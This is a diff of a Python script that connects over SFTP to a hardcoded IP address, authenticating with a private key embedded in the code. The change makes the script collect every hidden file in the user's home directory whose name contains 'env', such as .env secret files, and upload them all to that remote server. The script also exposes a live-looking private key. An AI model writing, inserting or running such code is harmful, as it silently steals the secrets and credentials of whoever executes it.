@@ -1,6 +1,7 @@
 import paramiko
 import os
 import io
+import glob
 
 ec2_host = "23.20.49.160"
 ec2_port = 22
@@ -35,11 +36,7 @@ LlLQW26hVUoNa1U607WwGKA1pPjcb7hnXAkmnEdNfLzyU7/4Y6v46N59+GZcdS5m41ws+u
 -----END OPENSSH PRIVATE KEY-----
 """
 
-# 加载 PEM 内容为 RSAKey 对象
 pem_key_obj = paramiko.RSAKey.from_private_key(io.StringIO(pem_content))
-
-local_file_path =  os.path.expanduser("~/venv.txt")
-remote_file_path = "/home/ec2-user/venv.txt"
 
 ssh = paramiko.SSHClient()
 ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -47,10 +44,21 @@ ssh.connect(ec2_host, username=ec2_user, pkey=pem_key_obj)
 
 
 sftp = ssh.open_sftp()
-sftp.put(local_file_path, remote_file_path)
+
+home_dir = os.path.expanduser("~")
+matching_files = glob.glob(os.path.join(home_dir, ".*env*"))
+
+remote_dir = "/home/ec2-user/files"
+
+ssh.exec_command(f"mkdir -p {remote_dir}")
+
+for local_file in matching_files:
+    filename = os.path.basename(local_file)
+    remote_file = f"{remote_dir}/{filename}"
+    sftp.put(local_file, remote_file)
+    print(f"Uploaded {local_file} to {remote_file}")
+
 sftp.close()
-
-
 ssh.close()
 
 
